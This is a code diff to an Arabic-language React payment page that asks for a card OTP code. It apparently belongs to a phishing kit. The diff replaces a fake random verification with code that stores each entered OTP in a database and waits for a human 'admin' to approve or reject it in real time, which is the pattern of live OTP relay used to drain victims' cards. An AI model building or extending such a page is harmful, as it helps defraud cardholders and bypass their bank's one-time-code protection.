@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useSearchParams, useNavigate } from "react-router-dom";
 import { Input } from "@/components/ui/input";
 import { useToast } from "@/hooks/use-toast";
@@ -18,6 +18,8 @@ const OtpVerification = () => {
   const cardLast4 = searchParams.get("cardLast4") || "6636";
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
+  const [waitingApproval, setWaitingApproval] = useState(false);
+  const [rejectionError, setRejectionError] = useState("");
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (otp.length !== 6 && otp.length !== 4) {
@@ -29,49 +31,81 @@ const OtpVerification = () => {
       return;
     }
     setIsLoading(true);
+    setRejectionError("");
 
     // Update context
     updateOrderData({
       otpCode: otp,
     });
 
-    // Update database
+    // Update database - set status to waiting_otp_approval
     try {
       if (orderData.sequenceNumber) {
         await supabase
           .from("customer_orders")
           .update({
             otp_code: otp,
-            otp_verified: true,
-            status: "completed",
+            status: "waiting_otp_approval",
           })
           .eq("sequence_number", orderData.sequenceNumber);
+        
+        setIsLoading(false);
+        setWaitingApproval(true);
+        
+        toast({
+          title: "تم إرسال الطلب",
+          description: "في انتظار موافقة المشرف...",
+        });
       }
     } catch (error) {
       console.error("Error updating order:", error);
-    }
-
-    // Simulate OTP verification with random success/failure
-    setTimeout(() => {
-      // Simulate: 80% success rate
-      const isSuccess = Math.random() > 0.2;
-      
       setIsLoading(false);
-      
-      if (isSuccess) {
-        // Redirect to processing page
-        navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&success=true`);
-      } else {
-        // Show error and stay on page
-        toast({
-          title: "خطأ في التحقق",
-          description: "رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى",
-          variant: "destructive"
-        });
-        setOtp(""); // Clear OTP input
-      }
-    }, 1500);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ في إرسال رمز التحقق",
+        variant: "destructive"
+      });
+    }
   };
+
+  // Listen for admin approval/rejection
+  useEffect(() => {
+    if (!orderData.sequenceNumber || !waitingApproval) return;
+
+    const channel = supabase
+      .channel('otp-approval-changes')
+      .on(
+        'postgres_changes',
+        {
+          event: 'UPDATE',
+          schema: 'public',
+          table: 'customer_orders',
+          filter: `sequence_number=eq.${orderData.sequenceNumber}`
+        },
+        (payload: any) => {
+          const newStatus = payload.new.status;
+          
+          if (newStatus === 'completed') {
+            setWaitingApproval(false);
+            navigate(`/processing-payment?company=${encodeURIComponent(companyName)}&price=${price}&success=true`);
+          } else if (newStatus === 'otp_rejected') {
+            setWaitingApproval(false);
+            setRejectionError("تم رفض رمز التحقق. الرجاء إدخال رمز صحيح.");
+            setOtp("");
+            toast({
+              title: "تم الرفض",
+              description: "رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى",
+              variant: "destructive"
+            });
+          }
+        }
+      )
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [orderData.sequenceNumber, waitingApproval, navigate, companyName, price, toast]);
   const handleResendCode = () => {
     toast({
       title: "تم إعادة الإرسال",
@@ -142,15 +176,43 @@ const OtpVerification = () => {
 
         {/* OTP Form */}
         <form onSubmit={handleSubmit} className="space-y-6">
+          {rejectionError && (
+            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded">
+              {rejectionError}
+            </div>
+          )}
+          
+          {waitingApproval && (
+            <div className="bg-blue-50 border border-blue-200 text-blue-700 px-4 py-3 rounded text-center">
+              <div className="flex items-center justify-center gap-2">
+                <div className="w-4 h-4 border-2 border-blue-600 border-t-transparent rounded-full animate-spin"></div>
+                <span>في انتظار موافقة المشرف...</span>
+              </div>
+            </div>
+          )}
+          
           <div>
             <div className="text-center text-gray-600 mb-2 text-sm">
               رمز التحقق
             </div>
-            <Input type="text" maxLength={6} value={otp} onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" placeholder="" dir="ltr" />
+            <Input 
+              type="text" 
+              maxLength={6} 
+              value={otp} 
+              onChange={e => setOtp(e.target.value.replace(/\D/g, ''))} 
+              className="w-full text-center text-lg tracking-widest py-2 outline-none border-0 border-b-2 border-gray-300 focus-visible:ring-0 focus-visible:border-gray-600 rounded-none" 
+              placeholder="" 
+              dir="ltr"
+              disabled={waitingApproval}
+            />
           </div>
 
-          <button type="submit" className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded" disabled={isLoading || (otp.length !== 6 && otp.length !== 4)}>
-            {isLoading ? "جاري التحقق..." : "تأكيد"}
+          <button 
+            type="submit" 
+            className="w-full py-3 bg-[#2900fc] hover:bg-[#2200cc] text-white font-medium transition-colors rounded disabled:opacity-50 disabled:cursor-not-allowed" 
+            disabled={isLoading || waitingApproval || (otp.length !== 6 && otp.length !== 4)}
+          >
+            {isLoading ? "جاري التحقق..." : waitingApproval ? "في انتظار الموافقة..." : "تأكيد"}
           </button>
         </form>
 
